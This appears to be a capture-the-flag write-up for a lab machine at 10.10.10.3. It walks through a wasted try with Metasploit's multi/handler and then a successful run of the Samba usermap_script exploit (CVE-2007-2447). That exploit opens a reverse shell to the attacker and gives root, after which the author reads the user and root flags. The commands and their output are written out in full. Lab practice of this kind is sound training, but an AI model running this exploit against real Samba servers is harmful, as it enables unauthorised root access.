## Attack Plan

### Option A: exploit/multi/handler ✗

**Why you tried it:** First instinct in Metasploit — wrong call.

1. Loaded the module:
```bash
use exploit/multi/handler
set RHOSTS 10.10.10.3
set LHOST <tun0-ip>
run
```
Result:
```
[*] Started reverse TCP handler on <tun0-ip>:4444
# nothing else — just sat there waiting for a connection that was never coming
```

**Why it failed:** `multi/handler` is for catching shells you've already delivered — it doesn't actually exploit anything. Burned about 20 minutes here before realising I had the wrong module entirely.

---

### Option B: exploit/multi/samba/usermap_script (CVE-2007-2447) ✓

**Why this worked:** Samba 3.0.20 has a username map script vulnerability — when the `username map script` option is enabled, Samba passes user-supplied input to `/bin/sh` without sanitising it. That means you can inject shell commands through the username field during authentication, no credentials needed. The Metasploit module handles all of it.

1. Load the correct module:
```bash
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
set LHOST <tun0-ip>
run
```
Result:
```
[*] Started reverse TCP handler on <tun0-ip>:4444
[*] Command shell session 1 opened
```

2. Shell looks completely blank at first — just type a command:
```bash
id
```
Result:
```
uid=0(root) gid=0(root) groups=0(root)
```

Landed straight as root. No privesc needed at all.

## Post Exploitation / Privilege Escalation

No privesc required — the exploit drops you directly into a root shell. Just grab the flags.

1. Get user flag:
```bash
find / -name user.txt 2>/dev/null
cat /home/makis/user.txt
```

2. Get root flag:
```bash
cat /root/root.txt
```

Result: `root shell — both flags obtained`
